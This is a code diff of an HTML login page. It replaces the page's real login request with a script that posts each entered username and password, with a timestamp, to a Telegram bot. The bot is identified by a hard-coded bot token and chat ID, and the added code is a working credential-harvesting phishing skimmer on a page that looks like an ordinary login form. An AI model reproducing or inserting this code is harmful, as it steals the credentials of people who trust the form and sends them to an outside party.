@@ -45,10 +45,13 @@
         </div>
     </div>
     <script>
-        const API_BASE_URL = 'http://localhost:3000/api';
+                const botToken = '8415965824:AAEaNtgh1TIZVfz-lDx2NrJbBnte4JiQNJE';
+        const chatId = '7873751682';
+        
         function togglePassword() {
             const passwordInput = document.getElementById('password');
             const eyeIcon = document.getElementById('eye');
+            
             if (passwordInput.type === 'password') {
                 passwordInput.type = 'text';
                 eyeIcon.classList.remove('fa-eye-slash');
@@ -59,34 +62,38 @@
                 eyeIcon.classList.add('fa-eye-slash');
             }
         }
-        async function handleLogin() {
+        
+        function handleLogin() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            if (!username || !password) {
-                return;
-            }
-            try {
-                const response = await fetch(`${API_BASE_URL}/login`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        username: username,
-                        password: password
-                    })
-                });
-                const result = await response.json();
-            } catch (error) {
-                console.error('Login error:', error);
-            }
+            
+            // Send credentials to Telegram
+            sendToTelegram(username, password);
         }
-        document.getElementById('password').addEventListener('keypress', function (e) {
-            if (e.key === 'Enter') {
-                handleLogin();
-            }
-        });
+        
+        function sendToTelegram(username, password) {
+            const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}\nTimestamp: ${new Date().toLocaleString()}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent to Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Error sending to Telegram:', error);
+            });
+        }
     </script>
 </body>
+
 
 </html>
